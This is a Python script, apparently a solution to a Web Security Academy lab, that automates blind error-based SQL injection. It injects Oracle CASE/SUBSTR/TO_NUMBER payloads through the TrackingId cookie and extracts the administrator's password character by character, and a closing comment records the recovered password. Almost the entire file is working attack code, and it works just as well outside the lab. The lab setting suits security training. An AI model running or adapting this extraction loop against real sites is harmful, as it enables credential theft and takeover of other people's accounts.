import requests
def send_request(payload):
    burp0_url = "https://0a6600620456687280bd08ab00860087.web-security-academy.net:443/filter?category=Tech+gifts"
    burp0_cookies = {"TrackingId": f"{payload}", "session": "oQ6AHeooI0TKF4TsVoxMJIsS0iOYUDcA"}
    burp0_headers = {"Sec-Ch-Ua": "\"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"",
                     "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"",
                     "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                     "Sec-Fetch-Site": "same-origin",
                     "Sec-Fetch-Mode": "navigate",
                     "Sec-Fetch-User": "?1",
                     "Sec-Fetch-Dest": "document",
                     "Referer": "https://0a6600620456687280bd08ab00860087.web-security-academy.net/",
                     "Accept-Encoding": "gzip, deflate, br",
                     "Priority": "u=0, i"}
    result = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    
    return result


characters = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""


#testing payload sGKJZ6uQJF1zxWxD'||(SELECT CASE WHEN SUBSTR('test',1,1)='t' THEN 1 ELSE TO_NUMBER('a') END FROM dual)--

# Out of range if equals to ''
index = 1
while True:
    flag=False
    for c in characters:
        injected=f"'||(SELECT CASE WHEN SUBSTR(password,{index},1)='{c}' THEN 1 ELSE TO_NUMBER('a') END FROM users WHERE username='administrator')--"
        # Correct cookie: sGKJZ6uQJF1zxWxD
        payload = f"sGKJZ6uQJF1zxWxD{injected}"

        result = send_request(payload)
        end_of_loop=f"sGKJZ6uQJF1zxWxD'||(SELECT CASE WHEN SUBSTR(password,{index},1) IS NULL THEN 1 ELSE TO_NUMBER('a') END FROM users WHERE username='administrator')--"
        if send_request(end_of_loop).status_code==200:
            flag=True
            break
        elif result.status_code==200:
            print(f"Found character: {c}")
            password += c
            index += 1
            break
    if flag:
        break
print(f"Extracted password: {password}")

#mupdfwk3o6akf5bq2ibn